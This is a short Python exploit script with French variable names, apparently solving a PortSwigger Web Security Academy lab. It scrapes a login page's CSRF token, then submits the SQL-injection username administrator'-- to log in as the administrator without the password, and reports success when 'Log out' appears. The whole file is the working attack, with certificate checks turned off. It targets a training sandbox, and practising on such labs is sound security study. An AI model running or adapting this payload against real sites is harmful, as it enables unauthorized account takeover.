import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

def get_csrf(mon_url,ma_session):
    try:
        final_url=mon_url+"/login"
        reponse=ma_session.get(final_url,verify=False)
        soup_reponse=BeautifulSoup(reponse.text,'html.parser')
        mon_csrf=soup_reponse.find('input',{'name':'csrf'})['value']
        return mon_csrf
    except Exception as mon_exception:
        print(f"Erreur : {mon_exception}")
        

def lancer_exploit(url,session):
    try:
        url_finale=url+"/login"
        exploit_csrf=get_csrf(url,session)
        mon_payload={"csrf":exploit_csrf,"username":"administrator'--","password":"admin"}
        reponse_exploit=session.post(url_finale,data=mon_payload,verify=False)
        #print(reponse_exploit.text)
        if "Log out" in reponse_exploit.text:
            print("Succes de l'injection")
        else:
            print("Erreur pas d'injection effectuer")
    except Exception as exception:
        print(f"Erreur : {exception}")
    


session=requests.Session()
lancer_exploit("https://0a0f00c6043591c081bef852002c0086.web-security-academy.net",session)